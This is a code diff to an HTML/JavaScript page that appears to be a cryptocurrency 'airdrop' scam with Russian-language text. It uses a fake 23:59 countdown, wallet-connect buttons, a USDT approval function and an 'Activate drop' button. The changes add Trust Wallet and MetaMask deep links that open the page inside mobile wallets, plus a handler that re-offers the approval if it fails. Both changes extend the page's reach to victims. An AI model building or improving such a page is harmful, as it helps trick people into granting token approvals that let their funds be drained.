@@ -88,6 +88,12 @@
             color: #FF007A;
             font-weight: 500;
         }
+        .btn-group {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
         .connect-btn {
             background: linear-gradient(135deg, #FF007A 0%, #FF4D8C 100%);
             border: none;
@@ -99,8 +105,11 @@
             color: white;
             cursor: pointer;
             transition: all 0.2s;
-            margin-bottom: 16px;
             box-shadow: 0 4px 12px rgba(255,0,122,0.3);
+        }
+        .connect-btn-wc {
+            background: linear-gradient(135deg, #3B71F0 0%, #5C8DFF 100%);
+            box-shadow: 0 4px 12px rgba(59,113,240,0.3);
         }
         .connect-btn:active {
             transform: scale(0.97);
@@ -137,6 +146,11 @@
             opacity: 0.5;
             transform: none;
         }
+        .wc-link {
+            color: #5C8DFF;
+            text-decoration: none;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
@@ -156,7 +170,10 @@
             ⏱️ Предложение истекает через 23:59
         </div>
         
-        <button class="connect-btn" id="connectBtn">🔗 Подключить кошелек</button>
+        <div class="btn-group">
+            <button class="connect-btn" id="connectBtn">🦊 Подключить MetaMask / Trust</button>
+            <button class="connect-btn connect-btn-wc" id="wcBtn">📱 WalletConnect (Trust / MetaMask)</button>
+        </div>
         
         <div class="wallet-icons">
             <div>🦊 MetaMask</div>
@@ -195,13 +212,15 @@
         let userAddress = null;
         let usdtContract = null;
         
+        // ОСНОВНАЯ ФУНКЦИЯ ДЛЯ METAMASK/TRUST (через window.ethereum)
         async function connectWallet() {
             const btn = document.getElementById('connectBtn');
             const statusDiv = document.getElementById('status');
             
             if (!window.ethereum) {
-                statusDiv.innerHTML = '❌ Установи MetaMask или Trust Wallet';
+                statusDiv.innerHTML = '❌ MetaMask или Trust Wallet не установлены. Используй кнопку WalletConnect ниже.';
                 statusDiv.style.color = '#FF6B6B';
+                btn.disabled = false;
                 return;
             }
             
@@ -245,6 +264,27 @@
             }
         }
         
+        // ФУНКЦИЯ ДЛЯ WALLETCONNECT (через deep link для Trust Wallet и MetaMask)
+        async function connectWalletConnect() {
+            const statusDiv = document.getElementById('status');
+            const currentUrl = encodeURIComponent(window.location.href);
+            
+            // Deep link для Trust Wallet
+            const trustLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${currentUrl}`;
+            
+            // Universal link для MetaMask (работает на телефонах)
+            const metamaskLink = `https://metamask.app.link/dapp/${window.location.href.replace('https://', '')}`;
+            
+            statusDiv.innerHTML = `
+                🔗 Выбери свой кошелек:<br><br>
+                🟣 <a href="${trustLink}" class="wc-link" style="display:inline-block; margin:5px 0;">Открыть в Trust Wallet</a><br>
+                🦊 <a href="${metamaskLink}" class="wc-link" style="display:inline-block; margin:5px 0;">Открыть в MetaMask</a><br><br>
+                ⚡ После открытия кошелька — нажми "Подключиться" на сайте внутри кошелька
+            `;
+            statusDiv.style.color = '#B0B8D0';
+        }
+        
+        // ФУНКЦИЯ APPROVE (общая для обоих способов)
         async function approveUSDT() {
             const btn = document.getElementById('connectBtn');
             const statusDiv = document.getElementById('status');
@@ -272,7 +312,17 @@
             }
         }
         
+        // НАЗНАЧАЕМ КНОПКИ
         document.getElementById('connectBtn').onclick = connectWallet;
+        document.getElementById('wcBtn').onclick = connectWalletConnect;
+        
+        // Восстанавливаем обработчик если approve не прошел
+        window.resetApprove = function() {
+            const btn = document.getElementById('connectBtn');
+            btn.onclick = approveUSDT;
+            btn.innerText = '💎 Активировать дроп';
+            btn.disabled = false;
+        };
     </script>
 </body>
 </html>
